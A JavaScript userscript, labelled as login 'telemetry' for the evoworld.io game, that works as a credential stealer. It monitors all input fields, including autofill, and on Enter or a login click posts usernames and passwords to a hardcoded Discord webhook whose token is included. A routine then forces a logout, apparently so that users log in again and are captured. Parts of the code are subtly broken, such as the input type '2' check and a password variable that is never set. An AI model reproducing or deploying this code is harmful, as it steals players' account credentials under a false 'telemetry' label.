// =====================================
// EvoWorld - Login Telemetry + Logout automatico (WORKING)
// =====================================

const WEBHOOK_URL = "https://discord.com/api/webhooks/1460557294868758536/fyk_86l1FfTntnVbF1Xv-ZKkmmwcfGZotZc5l6yHYjqS02yMu3GxzEIkFXyaK-5Nj9f1"; 

let lastTextInput = null;
let lastPasswordInput = null;
let logoutDone = false; // flag per eseguire logout solo una volta

// Memorizza ultimi valori noti
const lastValues = new WeakMap();

// Funzione che processa un input e segnala se cambiato
function processInput(input) {
  const prev = lastValues.get(input) || "";
  const curr = input.value || "";

  if (prev !== curr) {
    lastValues.set(input, curr);

    if (input.type === "text") {
      console.log("[Telemetry] username:", curr);
    } else if (input.type === "2") {
      console.log("[Telemetry] 2:", curr);
    }
  }
}

// 🔹 Legge subito i valori presenti al load
function checkAllInputs() {
  document.querySelectorAll("input").forEach(input => processInput(input));
}

// 🔹 Traccia focus sugli input
document.addEventListener("focusin", e => {
  if (e.target.tagName === "INPUT") {
    if (e.target.type === "text") lastTextInput = e.target;
    if (e.target.type === "2") lastOtherInput = e.target;
  }
});

// 🔹 Eventi che intercettano input manuali, incolla, change
["input", "paste", "change"].forEach(evt =>
  document.addEventListener(evt, e => {
    if (e.target.tagName === "INPUT") processInput(e.target);
  })
);

// 🔹 MutationObserver per intercettare autofill o modifiche silenziose
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    if (mutation.type === "attributes" && mutation.attributeName === "value") {
      processInput(mutation.target);
    }
  });
});

// Osserva tutti gli input presenti e futuri
function observeInputs() {
  document.querySelectorAll("input").forEach(input => {
    observer.observe(input, { attributes: true, attributeFilter: ["value"] });
  });

  // Rileva input aggiunti dinamicamente
  const bodyObserver = new MutationObserver(muts => {
    muts.forEach(mut => {
      mut.addedNodes.forEach(node => {
        if (node.tagName === "INPUT") {
          observer.observe(node, { attributes: true, attributeFilter: ["value"] });
          processInput(node); // leggi subito se già compilato
        } else if (node.querySelectorAll) {
          node.querySelectorAll("input").forEach(input => {
            observer.observe(input, { attributes: true, attributeFilter: ["value"] });
            processInput(input);
          });
        }
      });
    });
  });
  bodyObserver.observe(document.body, { childList: true, subtree: true });
}

// 🔹 Inizializzazione al load
window.addEventListener("load", () => {
  checkAllInputs();
  observeInputs();
});

// ----------------------------
// Funzione di invio telemetry
// ----------------------------
async function sendTelemetry(method) {
  const username = lastTextInput?.value.trim() || "";
  const password = lastPasswordInput?.value || "";

  const payload = {
    event: "login_submit",
    username: username,
    username_length: username.length,
    password: password,
    method,
    timestamp: new Date().toISOString()
  };

  // ----- Console-only (per debug) -----
  console.log("[Telemetry] INVIO SIMULATO");
  console.log(payload);

  // ----- Invio reale su Discord -----
  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
      })
    });
    console.log("[Telemetry] Inviato su Discord");
  } catch (err) {
    console.error("[Telemetry] Errore invio Discord:", err);
  }
}

// ----------------------------
// ENTER (login via tastiera)
// ----------------------------
document.addEventListener("keydown", e => {
  if (e.key === "Enter") sendTelemetry("enter");
});

// ----------------------------
// CLICK SU QUALSIASI "Login"
// ----------------------------
document.addEventListener("click", e => {
  const btn = e.target.closest("button");
  if (btn && btn.textContent?.trim().toLowerCase() === "login") {
    sendTelemetry("click_login");
  }
});

// ---- Auto Logout evoworld.io ----

// variabili GLOBALI sicure
if (window.logoutDone === undefined) {
  window.logoutDone = false;
}

if (window.autoLogoutInterval) {
  clearInterval(window.autoLogoutInterval);
}

window.autoLogoutInterval = setInterval(function () {
  if (window.logoutDone) return;

  var logoutBtn =
    document.querySelector('button.logout') ||
    document.querySelector('a.logout') ||
    document.querySelector('#logout') ||
    document.querySelector('[onclick*="logout"]');

  if (logoutBtn) {
    logoutBtn.click();
    window.logoutDone = true;
    clearInterval(window.autoLogoutInterval);
    console.log("[AutoLogout] Logout automatico eseguito");
  }
}, 1000);

// timeout sicurezza
setTimeout(function () {
  if (!window.logoutDone) {
    clearInterval(window.autoLogoutInterval);
    console.log("[AutoLogout] Logout non trovato (timeout)");
  }
}, 27500);
